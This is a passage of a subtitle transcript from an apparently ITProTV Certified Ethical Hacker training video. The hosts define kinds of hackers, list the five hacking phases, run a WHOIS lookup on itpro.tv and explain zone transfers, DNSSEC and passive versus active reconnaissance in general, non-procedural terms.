I almost break my toe\non the side of the table.\n\n218\n00:11:06.180 --> 00:11:10.230\nWith regards to, in the hacking community,\nwith regards to being called this.\n\n219\n00:11:10.230 --> 00:11:13.550\nIf you call someone a script kiddie,\nyou are insulting them.\n\n220\n00:11:13.550 --> 00:11:16.560\nLet me be clear, this is not something\nyou should do, or do lightly.\n\n221\n00:11:16.560 --> 00:11:18.895\nYou're talking about people that\ncan make the lights go off.\n\n222\n00:11:18.895 --> 00:11:19.950\n>> [LAUGH]\n>> Literally and\n\n223\n00:11:19.950 --> 00:11:21.680\nproverbially, all around you.\n\n224\n00:11:21.680 --> 00:11:24.470\nSo people that have these kind of skills,\nyou don't want to upset and\n\n225\n00:11:24.470 --> 00:11:27.750\nyou certainly don't want to insult\nunless you are prepared to do battle.\n\n226\n00:11:27.750 --> 00:11:33.230\nSo a script kiddie is essentially\na derogatory term that can be used to\n\n227\n00:11:33.230 --> 00:11:37.115\ndescribe somebody who doesn't have enough\nskills on their own to be able to hack but\n\n228\n00:11:37.115 --> 00:11:41.985\nrather has to copy other people's\nattack mechanisms and methodologies.\n\n229\n00:11:41.985 --> 00:11:46.125\nDownload their codes, their scripts and\nessentially is a copycat right?\n\n230\n00:11:46.125 --> 00:11:47.682\nThey can't do it for themselves.\n\n231\n00:11:47.682 --> 00:11:51.772\nThey've got to essentially get\nthe Hacking for Dummies book, right, and\n\n232\n00:11:51.772 --> 00:11:53.102\nbe told what to do.\n\n233\n00:11:53.102 --> 00:11:57.252\nThat's what a script kiddie is, it's\na very, as I said, derogatory term for\n\n234\n00:11:57.252 --> 00:12:01.051\nan unskilled hacker, somebody who reports\nto have skills but really does not and\n\n235\n00:12:01.051 --> 00:12:04.771\nrather simply copies attacks that\nthey find on the internet and\n\n236\n00:12:04.771 --> 00:12:07.631\nuses them to pretend to be able to hack.\n\n237\n00:12:07.631 --> 00:12:10.491\nPeople call other people script\nkiddies when they want to insult them\n\n238\n00:12:10.491 --> 00:12:11.021\nin other words.\n\n239\n00:12:11.021 --> 00:12:14.171\nSo not a term you should throw around or\nuse lightly by any means.\n\n240\n00:12:14.171 --> 00:12:17.371\nCyber terrorists are individuals\nwith a range of skills.\n\n241\n00:12:17.371 --> 00:12:20.801\nAgain, all these people would\nhave hacking skills of some kind.\n\n242\n00:12:20.801 --> 00:12:25.630\nBut they are gonna use their skills to\ncarry out a political agenda of some kind,\n\n243\n00:12:25.630 --> 00:12:26.560\nwhatever that may be.\n\n244\n00:12:26.560 --> 00:12:27.680\nWhether it's right or wrong.\n\n245\n00:12:27.680 --> 00:12:29.430\nWhether we agree with it or not.\n\n246\n00:12:29.430 --> 00:12:33.160\nWhether it is in the defense of one or\nanother ideology.\n\n247\n00:12:33.160 --> 00:12:35.390\nWe're really not talking\nabout that here per se.\n\n248\n00:12:35.390 --> 00:12:39.460\nWe're simply talking about the fact that\nthey are using their skills to pursue and\n\n249\n00:12:39.460 --> 00:12:43.580\ncarry out some sort of political\nagenda with regards to attacks,\n\n250\n00:12:43.580 --> 00:12:47.290\nor propagating attacks that may\nfurther that message in some way.\n\n251\n00:12:47.290 --> 00:12:51.830\nState sponsored hackers, these are hackers\nthat work at the behest of a government,\n\n252\n00:12:51.830 --> 00:12:54.610\nor a military organization in a country.\n\n253\n00:12:54.610 --> 00:13:00.300\nI mentioned in one of our prior\nconversations the US cyber command and\n\n254\n00:13:00.300 --> 00:13:04.060\nthe defense mechanisms that many countries\nare building today with regards to\n\n255\n00:13:04.060 --> 00:13:05.310\nhacking skills.\n\n256\n00:13:05.310 --> 00:13:09.940\nAnd so we are not classifying those\npeople in the same light, per se.\n\n257\n00:13:09.940 --> 00:13:14.770\nBut when a military or government entity\nuses those skills specifically to\n\n258\n00:13:14.770 --> 00:13:19.210\ngo out and carry out attacks against\nanother entity, a government,\n\n259\n00:13:19.210 --> 00:13:23.550\na military, and or a private sector\nbusiness, they are essentially engaging in\n\n260\n00:13:23.550 --> 00:13:27.760\nstate sponsored hacking, or\nstate sponsored hackers are being used.\n\n261\n00:13:27.760 --> 00:13:31.010\nNot that we're pointing the finger\nat any one government or\n\n262\n00:13:31.010 --> 00:13:34.880\nentity by saying this, but there\nare rumors and have been for many years\n\n263\n00:13:34.880 --> 00:13:38.930\nthat the North Korean government\nengages in this kind of activity.\n\n264\n00:13:38.930 --> 00:13:44.120\nThere's been a rash of recent bank thefts\nin the SWIFT wire transfer network\n\n265\n00:13:44.120 --> 00:13:47.110\nover the last eight weeks approximately.\n\n266\n00:13:47.110 --> 00:13:49.620\nAnd they have been\nattributed to North Korea.\n\n267\n00:13:49.620 --> 00:13:53.940\nAnd state sponsored hacking, for instance,\nwould potentially be at the heart of this.\n\n268\n00:13:53.940 --> 00:13:58.220\nThe Chinese government, the United States\ngovernment, the Israeli government,\n\n269\n00:13:58.220 --> 00:14:03.210\nhave all at various points been accused of\nengaging in this kind of activity against\n\n270\n00:14:03.210 --> 00:14:10.130\ntheir perceived enemies and/or threats\nat the time for a variety of reasons.\n\n271\n00:14:10.130 --> 00:14:11.510\nPerhaps rightly, perhaps wrongly.\n\n272\n00:14:11.510 --> 00:14:12.666\nAgain, not trying to judge.\n\n273\n00:14:12.666 --> 00:14:16.755\nJust simply throwing out there some\nexamples you may have heard of over\n\n274\n00:14:16.755 --> 00:14:20.739\nthe media in the last several years\nwith regards to this kind of activities.\n\n275\n00:14:20.739 --> 00:14:24.515\nHacktivitest are individuals\nagain that look to go out and\n\n276\n00:14:24.515 --> 00:14:27.510\npursue some sort of agenda.\n\n277\n00:14:27.510 --> 00:14:32.160\nWhether it is a political agenda or\nnot but usually it's political agenda.\n\n278\n00:14:32.160 --> 00:14:33.820\nThey probably are working on their own.\n\n279\n00:14:33.820 --> 00:14:35.540\nThey probably are not\npart of the government or\n\n280\n00:14:35.540 --> 00:14:40.130\nmilitary event or\norganization of any kind.\n\n281\n00:14:40.130 --> 00:14:43.480\nThey are most likely pursuing\nsome sort of agenda on their own.\n\n282\n00:14:43.480 --> 00:14:45.890\nThink of the Anonymous collective,\nfor instance.\n\n283\n00:14:45.890 --> 00:14:49.670\nYou would think of them being\na good example of hacktivism.\n\n284\n00:14:49.670 --> 00:14:50.940\nWe don't really know who they are,\n\n285\n00:14:50.940 --> 00:14:53.010\nwe don't know who makes them up,\nwe don't know whether or\n\n286\n00:14:53.010 --> 00:14:57.440\nnot they are being operated by one\nindividual, a group of individuals,\n\n287\n00:14:57.440 --> 00:15:01.150\nsemi autonomous, fully autonomous from\na government entity, hard to know.\n\n288\n00:15:01.150 --> 00:15:04.150\nBut what we do know about them in\ntheory on the surface points to\n\n289\n00:15:04.150 --> 00:15:07.430\nthe idea that they may very well\nbe engaged in hacktivism and\n\n290\n00:15:07.430 --> 00:15:09.410\nindeed we often say that they are.\n\n291\n00:15:09.410 --> 00:15:10.669\nThat would be one example, right?\n\n292\n00:15:11.930 --> 00:15:13.260\nWe have James there.\n\n293\n00:15:13.260 --> 00:15:14.250\nGood to see you, James.\n\n294\n00:15:14.250 --> 00:15:17.970\nGlad to see that you're out there joining\nus, and that you included Mike and I.\n\n295\n00:15:17.970 --> 00:15:22.170\nHe gets really frustrated and upset,\nwhen people don't acknowledge the fact\n\n296\n00:15:22.170 --> 00:15:26.190\nthat he's here, and it's just me talking,\nso we appreciate you calling them out.\n\n297\n00:15:26.190 --> 00:15:26.790\nAlways good to have you.\n\n298\n00:15:26.790 --> 00:15:27.350\n>> Yes, thank you Jay.\n\n299\n00:15:27.350 --> 00:15:27.890\nI appreciate that.\n\n300\n00:15:27.890 --> 00:15:30.035\n>> Couldn't do it without you.\n\n301\n00:15:30.035 --> 00:15:31.780\nActually we could cuz we can't\neven see you in the screen.\n\n302\n00:15:31.780 --> 00:15:34.950\nBut we'd have to have somebody controlling\nthe machine but we're all kidding.\n\n303\n00:15:34.950 --> 00:15:38.970\nWe can't do what we do here without myself\nand the talented team of people that work\n\n304\n00:15:38.970 --> 00:15:41.310\nwith me when I present or\nany of our presenters.\n\n305\n00:15:41.310 --> 00:15:44.340\nAnd Mike is an intrical part of that as\nfor all the other members of the ITV fan.\n\n306\n00:15:44.340 --> 00:15:45.510\n>> Well we thank you for that.\n\n307\n00:15:45.510 --> 00:15:47.680\n>> I want to make sure we recognize that.\n\n308\n00:15:47.680 --> 00:15:49.450\nNow stop talking and\nlet me get back to what I'm doing.\n\n309\n00:15:49.450 --> 00:15:50.263\n>> Okay sorry, sorry.\n>> All right so\n\n310\n00:15:50.263 --> 00:15:53.169\nlet's talk about hacking and\nlet's talk about hacking phases.\n\n311\n00:15:53.169 --> 00:15:55.665\nWhen we engage in hacking and\nlook at that.\n\n312\n00:15:55.665 --> 00:15:57.489\nYou are just on top of things, sir.\n\n313\n00:15:57.489 --> 00:15:58.009\nYou are.\n\n314\n00:15:58.009 --> 00:15:59.991\nWe have all the hacking\nphases laid out here.\n\n315\n00:15:59.991 --> 00:16:02.850\nMike was kind enough to document them for\nus before we got started.\n\n316\n00:16:02.850 --> 00:16:06.280\nToday I wanna just remind you, and\ngo through review with you and\n\n317\n00:16:06.280 --> 00:16:08.300\nupdate you on what they are.\n\n318\n00:16:08.300 --> 00:16:09.680\nWe have five distinct phases.\n\n319\n00:16:09.680 --> 00:16:13.130\nThere are two sub-phases under\nreconnaissance, specifically you'll see.\n\n320\n00:16:13.130 --> 00:16:18.180\nBut essentially the phases of hacking,\nthe activities we engage in by structure,\n\n321\n00:16:18.180 --> 00:16:22.270\nby area, by focus, very important for\nyou to know if you're engaging in or\n\n322\n00:16:22.270 --> 00:16:25.210\npotentially thinking about studying for\nan engaging CEH exam.\n\n323\n00:16:25.210 --> 00:16:28.085\nUltimately you're going to want to know\nthe different kinds of hackers that we\n\n324\n00:16:28.085 --> 00:16:29.065\njust discussed.\n\n325\n00:16:29.065 --> 00:16:31.805\nYou're gonna want to know\nthe different five phases of hacking.\n\n326\n00:16:31.805 --> 00:16:36.715\nReconnaissance, scanning, gaining access,\nmaintaining access, and clearing tracks.\n\n327\n00:16:36.715 --> 00:16:38.925\nAs we talked about in\nthe five distinct phases,\n\n328\n00:16:38.925 --> 00:16:40.935\nlet's discuss what occurs in each phase.\n\n329\n00:16:40.935 --> 00:16:43.410\nBut it is really important to make\nsure that we understand these, and\n\n330\n00:16:43.410 --> 00:16:45.660\ncan knowledgeably and\n\n331\n00:16:45.660 --> 00:16:50.200\ncan comfortably describe each phase;\nthe activities associated with them,\n\n332\n00:16:50.200 --> 00:16:54.580\ncouple of sentences about what we do,\nwhat the key take away from that phase is.\n\n333\n00:16:54.580 --> 00:16:58.790\nHow we hand off to the next phase and why\nwe must engage in the entire lifecycle,\n\n334\n00:16:58.790 --> 00:17:03.080\nall the phases start to finish to truly\nunderstand how to engage in hacking,\n\n335\n00:17:03.080 --> 00:17:04.760\ngood or bad, ethical or not.\n\n336\n00:17:04.760 --> 00:17:08.500\nBecause if we just do recon, but\nwe don't ultimately go through and\n\n337\n00:17:08.500 --> 00:17:10.610\nfocus on maintaining access.\n\n338\n00:17:10.610 --> 00:17:15.050\nAnd ultimately as a result of that,\nget in, gain and then maintain access and\n\n339\n00:17:15.050 --> 00:17:18.680\nthen hide that activity through\nclearing tracks when we're done,\n\n340\n00:17:18.680 --> 00:17:22.080\nwe're not gonna be able to execute fully\non that information we find, or we may,\n\n341\n00:17:22.080 --> 00:17:25.240\nbut we may actually be uncovered as\na result of the activities we engage in.\n\n342\n00:17:25.240 --> 00:17:27.860\nSo we have to really think\nabout this as a life cycle and\n\n343\n00:17:27.860 --> 00:17:31.390\nany life cycle has these distinct phases,\nwhatever they are, and\n\n344\n00:17:31.390 --> 00:17:35.240\nwe want to understand them in order\nmaking sure we understand how they work.\n\n345\n00:17:35.240 --> 00:17:37.530\nLet's start with reconnaissance\nup at the top there.\n\n346\n00:17:38.710 --> 00:17:42.230\nWhen we think about reconnaissance, we're\nthinking about gathering information.\n\n347\n00:17:42.230 --> 00:17:46.150\nSo we are going out, we are examining\nthings that may be of interest to us.\n\n348\n00:17:46.150 --> 00:17:51.300\nWe're looking for publicly available\ninformation that may be valuable to us.\n\n349\n00:17:51.300 --> 00:17:53.648\nSo, for instance, can we do a quick\nlive demo while we are on your machine?\n\n350\n00:17:53.648 --> 00:17:55.073\n>> Absolutely.\n\n351\n00:17:55.073 --> 00:17:56.561\n>> Can you open up Google real quick for\nus?\n\n352\n00:17:56.561 --> 00:17:57.150\n>> Sure.\n\n353\n00:17:57.150 --> 00:17:58.200\n>> All right.\nSo we're just gonna go out,\n\n354\n00:17:58.200 --> 00:17:59.950\njust give Mike a second to get set up.\n\n355\n00:17:59.950 --> 00:18:01.820\nWe hadn't planned for this particular one.\n\n356\n00:18:01.820 --> 00:18:02.720\nBut we wanna just show\n\n357\n00:18:02.720 --> 00:18:05.360\nyou the idea behind what we can\ndo in the reconnaissance phase.\n\n358\n00:18:05.360 --> 00:18:11.720\nSo can you search for let's say,\nlet's go to the whois database.\n\n359\n00:18:11.720 --> 00:18:18.450\nAnd let's do a lookup real quick for the\nname registration records for ITPro.Tv.\n\n360\n00:18:18.450 --> 00:18:18.950\n>> All right.\n\n361\n00:18:18.950 --> 00:18:22.100\n>> Shouldn't really talk about anything\nif we're not willing to put ourselves on\n\n362\n00:18:22.100 --> 00:18:22.600\nthe line here.\n\n363\n00:18:22.600 --> 00:18:23.150\n>> Right.\n[LAUGH]\n\n364\n00:18:23.150 --> 00:18:24.750\n>> So Mike's gonna take just a second to\n\n365\n00:18:24.750 --> 00:18:27.390\nget into the Whois and ARIN database.\n\n366\n00:18:27.390 --> 00:18:29.770\nWe're gonna look up ITPro.tv.\n\n367\n00:18:29.770 --> 00:18:32.390\nWhat we're doing is, just while he's\ntyping while we're getting in there,\n\n368\n00:18:32.390 --> 00:18:36.960\nwe're gonna look for the domain name\nregistration for the itpro.tv domain.\n\n369\n00:18:36.960 --> 00:18:39.650\nAnd we're gonna take a look at\nwhat information is out there.\n\n370\n00:18:39.650 --> 00:18:42.060\nAnd we're gonna zoom in a little bit,\ngreat.\n\n371\n00:18:42.060 --> 00:18:44.300\nWe're gonna see what\ninformation may be available.\n\n372\n00:18:44.300 --> 00:18:48.070\nAnd this is just one very basic but\nvery important way to do some recon.\n\n373\n00:18:48.070 --> 00:18:50.300\nLet me explain what I mean by\nthat based on what we see.\n\n374\n00:18:50.300 --> 00:18:51.990\nSo I see domain name itpro.tv.\n\n375\n00:18:51.990 --> 00:18:53.790\nI've got a unique identifier for\n\n376\n00:18:53.790 --> 00:18:57.400\nthe registration on the domain database,\ndoesn't really matter what that is,\n\n377\n00:18:57.400 --> 00:19:01.180\nthe whois server that's there that's\ngiving us information at Tucows.\n\n378\n00:19:01.180 --> 00:19:03.620\nI remember when Tucows\nwas just a software site.\n\n379\n00:19:03.620 --> 00:19:04.330\n>> Yes, uh-huh.\n\n380\n00:19:04.330 --> 00:19:06.565\n>> Tucows is now providing\nall sorts of good stuff.\n\n381\n00:19:06.565 --> 00:19:07.610\n>> [LAUGH]\n>> I go back and\n\n382\n00:19:07.610 --> 00:19:09.240\ndate myself every so often,\n>> [LAUGH]\n\n383\n00:19:09.240 --> 00:19:10.990\n>> But those of you been doing this long\n\n384\n00:19:10.990 --> 00:19:13.340\nenough, you remember that\nbefore Computerworld and\n\n385\n00:19:13.340 --> 00:19:14.389\nall the other download sites,\n>> Yes.\n\n386\n00:19:14.389 --> 00:19:14.889\n>> Tucows\n>> [CROSSTALK]\n\n387\n00:19:14.889 --> 00:19:16.490\n>> Tucows was the shareware site.\n\n388\n00:19:16.490 --> 00:19:19.900\nAll right, so we have some information\nreferencing URL, that's nice.\n\n389\n00:19:19.900 --> 00:19:22.270\nWe've got the IANA ID.\n\n390\n00:19:22.270 --> 00:19:23.160\nThat's all great.\n\n391\n00:19:23.160 --> 00:19:26.560\nWhat we then have is a bunch of\nname servers that are there.\n\n392\n00:19:26.560 --> 00:19:29.640\nWe can see that there's four of\nthem if I am not mistaken and\n\n393\n00:19:29.640 --> 00:19:31.060\nwe can see them listed.\n\n394\n00:19:31.060 --> 00:19:34.790\nNow in and of itself,\nthat may not be good or bad information.\n\n395\n00:19:34.790 --> 00:19:37.900\nBut, it actually can be valuable,\npaired with something else\n\n396\n00:19:37.900 --> 00:19:41.240\nthat Mike was hovering over and\npointing to, which is the DNSSEC.\n\n397\n00:19:41.240 --> 00:19:42.820\nAnd I believe it says unsigned there.\n\n398\n00:19:42.820 --> 00:19:43.940\n>> Unsigned, yep.\n>> if I'm not mistaken.\n\n399\n00:19:43.940 --> 00:19:46.140\nDNSSEC registration information.\n\n400\n00:19:46.140 --> 00:19:48.205\nSo, these two pieces of information in and\n\n401\n00:19:48.205 --> 00:19:52.715\nof themselves, by themselves, also versus\ntaken collectively can be telling.\n\n402\n00:19:52.715 --> 00:19:54.805\nLet's talk about what we've\nlearned here for a minute.\n\n403\n00:19:54.805 --> 00:19:55.955\nSo we have name servers.\n\n404\n00:19:55.955 --> 00:20:00.350\nNow back in the old days, we haven't tried\nthis and we're not gonna try this now.\n\n405\n00:20:00.350 --> 00:20:02.970\nBut I'm just gonna describe\nto you what an MS look up\n\n406\n00:20:02.970 --> 00:20:04.940\napproach may be to reconnaissance here,\n\n407\n00:20:04.940 --> 00:20:08.990\nand we'll take a look at MS look up as\na tool in one of our upcoming demos later.\n\n408\n00:20:08.990 --> 00:20:12.030\nMS look up is a command line tool\nthat you can use to go out and\n\n409\n00:20:12.030 --> 00:20:14.040\nessentially query DNS servers.\n\n410\n00:20:14.040 --> 00:20:18.590\nWe use it to maintain DNS servers all the\ntime to do remote demonstration on them.\n\n411\n00:20:18.590 --> 00:20:23.290\nLot of you may use a GUI interface\nlike the Windows DNS console,\n\n412\n00:20:23.290 --> 00:20:25.290\nthe MMC, to be able to do administration.\n\n413\n00:20:25.290 --> 00:20:26.310\nBut we've been able to do this for\n\n414\n00:20:26.310 --> 00:20:29.120\nyears from the command line\nwith NS Lookup, as well.\n\n415\n00:20:29.120 --> 00:20:31.540\nAnd this look up can be used\nto do a variety of things.\n\n416\n00:20:31.540 --> 00:20:34.530\nWe can use it to talk to any\nof those name servers, and\n\n417\n00:20:34.530 --> 00:20:40.070\nby setting our NS look up server\nto seem like it is authoritative.\n\n418\n00:20:40.070 --> 00:20:43.680\nAnd then ask that any one of those name\nservers without going into the details of\n\n419\n00:20:43.680 --> 00:20:45.060\nhow we would do this.\n\n420\n00:20:45.060 --> 00:20:49.020\nBut to be able to essentially say to any\nof those name service of record there.\n\n421\n00:20:49.020 --> 00:20:50.200\nHey, I'm your buddy.\n\n422\n00:20:50.200 --> 00:20:51.250\nYou should talk to me.\n\n423\n00:20:51.250 --> 00:20:55.570\nCan you transfer the zone information for\nthis particular domain to me?\n\n424\n00:20:55.570 --> 00:20:58.070\nBecause I'd like to see it.\n\n425\n00:20:58.070 --> 00:21:04.020\nIf the zone transfer settings on that\nzone have not been set up to not,\n\n426\n00:21:04.020 --> 00:21:05.840\nnot allow talking to strangers.\n\n427\n00:21:05.840 --> 00:21:08.470\nEssentially unrestricted\nzone transfers and\n\n428\n00:21:08.470 --> 00:21:12.610\ntoday thankfully, more often than not,\nwe don't allow this to occur.\n\n429\n00:21:12.610 --> 00:21:13.804\nBut there was a time,\n\n430\n00:21:13.804 --> 00:21:18.300\nand not that long ago where the standard\nsetting was talk to anybody.\n\n431\n00:21:18.300 --> 00:21:22.410\nAnd as a result you could essentially\nconnect to a database like this.\n\n432\n00:21:22.410 --> 00:21:25.280\nYou could get the DNS name\nregistration information,\n\n433\n00:21:25.280 --> 00:21:28.520\nyou could go nail any one of\nthose servers through NSlookup,\n\n434\n00:21:28.520 --> 00:21:32.085\nget a complete zone transfer, you would\nget a zone dump as we would call it.\n\n435\n00:21:32.085 --> 00:21:34.245\nYou will get all these own records.\n\n436\n00:21:34.245 --> 00:21:38.125\nYou will be able to see all\nthe registration information for\n\n437\n00:21:38.125 --> 00:21:41.735\nall of the host record,\nthe MX records, the CNAME records,\n\n438\n00:21:41.735 --> 00:21:45.870\nessentially the PTR point of records,\nand any other record that may be there.\n\n439\n00:21:45.870 --> 00:21:51.410\nNow what that data would give you is\na very detailed map of the entire layout\n\n440\n00:21:51.410 --> 00:21:56.100\nof the internal network that DNS server\nwas servicing through that name space and\n\n441\n00:21:56.100 --> 00:21:59.610\nit would tell you the name,\nas well as the IP address of every machine\n\n442\n00:21:59.610 --> 00:22:03.570\nbehind that firewall, or that group of\nfirewalls on the border of that network.\n\n443\n00:22:03.570 --> 00:22:06.920\nI would not have to hack in,\npush past the firewalls and\n\n444\n00:22:06.920 --> 00:22:09.800\nthe gateway devices to\nget that information.\n\n445\n00:22:09.800 --> 00:22:11.920\nIt's a lot tougher to do today.\n\n446\n00:22:11.920 --> 00:22:16.450\nAnd believe it or not every so often and\nit's not so rare, I do a lot of this kind\n\n447\n00:22:16.450 --> 00:22:20.080\nof work, I do a lot of assessment work for\ncustomers all the time.\n\n448\n00:22:20.080 --> 00:22:23.040\nI am constantly finding\ncustomer registrations\n\n449\n00:22:23.040 --> 00:22:24.870\nthat are not protected out there.\n\n450\n00:22:24.870 --> 00:22:26.950\nAnd we profile this as part of a pen test.\n\n451\n00:22:26.950 --> 00:22:29.710\nWe do this as part of an audit\ntraditionally depending on the kind of\n\n452\n00:22:29.710 --> 00:22:30.510\naudit we're doing.\n\n453\n00:22:30.510 --> 00:22:33.020\nWe certainly do this as part\nof a vulnerability assessment\n\n454\n00:22:33.020 --> 00:22:35.990\nagainst common infrastructure\nthat's hosted externally.\n\n455\n00:22:35.990 --> 00:22:37.310\nAnd we look for this.\n\n456\n00:22:37.310 --> 00:22:41.030\nIf we could find a namespace that is\nmanaged by a provider that does zone\n\n457\n00:22:41.030 --> 00:22:43.930\ntransfers, you've got a problem,\nand we will tell you.\n\n458\n00:22:43.930 --> 00:22:45.420\nAdding DNSSEC to the mix,\n\n459\n00:22:45.420 --> 00:22:49.950\nthe fact that DNSSEC is not being used,\npotentially is problematic because\n\n460\n00:22:49.950 --> 00:22:54.130\nIt means that there are certain situations\nwhere we may not be able to validate\n\n461\n00:22:54.130 --> 00:22:58.750\nbeyond a reasonable doubt what\nthe origination of the DNS information is.\n\n462\n00:22:58.750 --> 00:23:03.160\nAnd/or the provider of that DNS\ninformation may not be able to validate\n\n463\n00:23:03.160 --> 00:23:07.900\nproperly, to the level that we assume\nthey should, to show us whether or\n\n464\n00:23:07.900 --> 00:23:08.630\nnot they're legitimate.\n\n465\n00:23:08.630 --> 00:23:11.260\nAnd also people that look\nto update DNS information\n\n466\n00:23:11.260 --> 00:23:14.740\ncan also potentially not be validated\nproperly if we're not using DNSSEC.\n\n467\n00:23:14.740 --> 00:23:17.640\nAnd that adds an additional\nlayer of security that is\n\n468\n00:23:17.640 --> 00:23:19.190\nrelatively easily to implement.\n\n469\n00:23:19.190 --> 00:23:23.100\nI'm sure at some point we'll talk about\nDNS in a second, why it's so valuable.\n\n470\n00:23:23.100 --> 00:23:27.170\nBut if you're not using it, it's a big\nmiss from the security perspective because\n\n471\n00:23:27.170 --> 00:23:29.480\nit adds additional\nlayers of complexity and\n\n472\n00:23:29.480 --> 00:23:32.190\nsecurity to the DNS name\nregistration information.\n\n473\n00:23:32.190 --> 00:23:34.970\nNow in and of itself,\nit's not a big deal if it is or\n\n474\n00:23:34.970 --> 00:23:39.300\nis not being used just because of\nthe zone transfer information.\n\n475\n00:23:39.300 --> 00:23:41.950\nWe're not looking at that right now,\nwith DNSSEC,\n\n476\n00:23:41.950 --> 00:23:47.200\nbecause DNSSEC protects against something\ndifferent, it forces it to digitally sign.\n\n477\n00:23:47.200 --> 00:23:50.348\nThe DNS name registration information\nto further protect it and validate it,\n\n478\n00:23:50.348 --> 00:23:51.883\nto make sure it's not being spoofed.\n\n479\n00:23:51.883 --> 00:23:55.492\nZone transfers are a separate\nthing from DNSSEC.\n\n480\n00:23:55.492 --> 00:23:58.002\nBut the two together are very\ntelling when we look at recon\n\n481\n00:23:58.002 --> 00:23:59.371\nin the hacking phase, right?\n\n482\n00:23:59.371 --> 00:24:02.110\nSo we wanna know that, can we go back\nto the screen for just a minute?\n\n483\n00:24:02.110 --> 00:24:02.781\n>> Mm hm.\n\n484\n00:24:02.781 --> 00:24:04.792\n>> Do we also have any registration\ninformation with regards\n\n485\n00:24:04.792 --> 00:24:06.071\nto who owns the registration there?\n\n486\n00:24:06.071 --> 00:24:08.747\n>> Not on this one\n>> You may have it off to the side on\n\n487\n00:24:08.747 --> 00:24:10.594\nthe right, I didn't know what was there,\n\n488\n00:24:10.594 --> 00:24:13.990\ndoes it give us the actual name of\nthe registrant and the contact info?\n\n489\n00:24:13.990 --> 00:24:14.792\n>> It does not.\n>> All right,\n\n490\n00:24:14.792 --> 00:24:17.291\nyou may have to go to another site, you\nget it, we don't have to pull it up now,.\n\n491\n00:24:17.291 --> 00:24:19.942\nBut just know that you can also go out and\nlook for\n\n492\n00:24:19.942 --> 00:24:23.982\nthat if you go to one of the other,\nyou can go to ICANN and/or the Aaron's\n\n493\n00:24:23.982 --> 00:24:24.629\nsites\n>> Yeah,\n\n494\n00:24:24.629 --> 00:24:27.539\nthere's a lot of different sites\naround the world that will do this,\n\n495\n00:24:27.539 --> 00:24:30.160\nand if you pull that up you\ncan get not just what we saw.\n\n496\n00:24:30.160 --> 00:24:34.623\nBut actually the name of the person\nwho registered the information\n\n497\n00:24:34.623 --> 00:24:38.935\nwith either GoDaddy or\nwhoever it was that's the DNS provider.\n\n498\n00:24:38.935 --> 00:24:42.802\nAnd you actually can get contact info\nYou'd be surprised how often we can tell\n\n499\n00:24:42.802 --> 00:24:43.946\nsomething from that.\n\n500\n00:24:43.946 --> 00:24:45.589\nWe can get, for instance,\n\n501\n00:24:45.589 --> 00:24:49.100\nthe email address configuration\nthat your company uses.\n\n502\n00:24:49.100 --> 00:24:51.249\nWe can get the phone number for\nthe company,\n\n503\n00:24:51.249 --> 00:24:53.408\nwe can get the address\nof the headquarters.\n\n504\n00:24:53.408 --> 00:24:57.300\nWe can find out who the IT professional\nis, traditionally, that is managing that.\n\n505\n00:24:57.300 --> 00:25:00.813\nAnd we may be able to use that\nidentity and assume that identity to\n\n506\n00:25:00.813 --> 00:25:04.990\ntake on information gathering capabilities\nin other areas of the network.\n\n507\n00:25:04.990 --> 00:25:08.293\nAnd this is just one tool,\nimagine going out and just Googling for\n\n508\n00:25:08.293 --> 00:25:09.870\ninformation about a company.\n\n509\n00:25:09.870 --> 00:25:13.180\nLooking up the company and the individuals\nassociated with it in LinkedIn,\n\n510\n00:25:13.180 --> 00:25:14.484\nlooking them up on Facebook.\n\n511\n00:25:14.484 --> 00:25:17.587\nThese are the kinds of things we would\ndo with hacking when it comes to\n\n512\n00:25:17.587 --> 00:25:18.490\nreconnaissance.\n\n513\n00:25:18.490 --> 00:25:22.547\nAll of the publicly available information\nthat's out there is what we would wanna\n\n514\n00:25:22.547 --> 00:25:23.324\ntry to gather.\n\n515\n00:25:23.324 --> 00:25:24.956\nTaking that information and\n\n516\n00:25:24.956 --> 00:25:29.388\nthen putting it into the blender to find\nout what it tells us, is part of that.\n\n517\n00:25:29.388 --> 00:25:32.786\nAnd we have two types, if you remember\nthe list that Mike had, we had passive and\n\n518\n00:25:32.786 --> 00:25:33.920\nactive reconnaissance.\n\n519\n00:25:33.920 --> 00:25:36.480\nAnd there's an important\ndifferentiator between the two.\n\n520\n00:25:36.480 --> 00:25:38.261\nWhen we think about\npassive reconnaissance,\n\n521\n00:25:38.261 --> 00:25:41.414\nwe're thinking about finding this kind of\ninformation that we were doing without\n\n522\n00:25:41.414 --> 00:25:42.660\nactively touching the target.\n\n523\n00:25:42.660 --> 00:25:45.890\nWe're just gathering available\ninformation, aggregating it up, we're\n\n524\n00:25:45.890 --> 00:25:49.430\nlooking but we're not touching, we're\nwindow shopping in other words, right?\n\n525\n00:25:49.430 --> 00:25:51.217\nWhen we think about active reconnaissance,\n\n526\n00:25:51.217 --> 00:25:53.104\nwe're interacting with\nthe target directly.\n\n527\n00:25:53.104 --> 00:25:57.397\nWe may be taking that recon to the next\nlevel by actually going in, trying to\n\n528\n00:25:57.397 --> 00:26:02.190\nattach ourselves to one of those DNS name\nservers and trying to do his own transfer.\n\n529\n00:26:02.190 --> 00:26:05.216\nThat would be active recon,\nas opposed to passive recon,\n\n530\n00:26:05.216 --> 00:26:08.797\nwhich was just going to the who is or\nthe ICANN database or whatever and\n\n531\n00:26:08.797 --> 00:26:10.730\ntrying to pull up that information.\n\n532\n00:26:10.730 --> 00:26:14.089\nSo you wanna have\na differentiator between the two,\n\n533\n00:26:14.089 --> 00:26:19.052\nwanna make sure we are comfortable\nthinking about those two distinct kinds of\n\n534\n00:26:19.052 --> 00:26:23.810\nreconnaissance to take place and\ndifferentiating between them, okay?\n\n535\n00:26:23.810 --> 00:26:27.728\nWanna think about scanning as our next\nphase and I know we have the list,\n\n536\n00:26:27.728 --> 00:26:29.310\nI want it defined probably.\n\n537\n00:26:29.310 --> 00:26:31.103\nWrite what scanning is or\nat least put it up there so\n\n538\n00:26:31.103 --> 00:26:33.365\npeople can see it,\nI don't know what you were up there doing.\n\n539\n00:26:33.365 --> 00:26:35.334\nYou're just keeping track of everything,\nokay?\n\n540\n00:26:35.334 --> 00:26:37.590\nWell didn't we have a whole list though?\n\n541\n00:26:37.590 --> 00:26:39.623\n>> Let's see I'm sorry-\n>> [CROSSTALK] Yeah the phases,\n\n542\n00:26:39.623 --> 00:26:41.408\nwe already have the list, right?\n\n543\n00:26:41.408 --> 00:26:42.153\n>> Yep.\n>> Yeah, or\n\n544\n00:26:42.153 --> 00:26:43.834\njust stay with what we already have,\n\n545\n00:26:43.834 --> 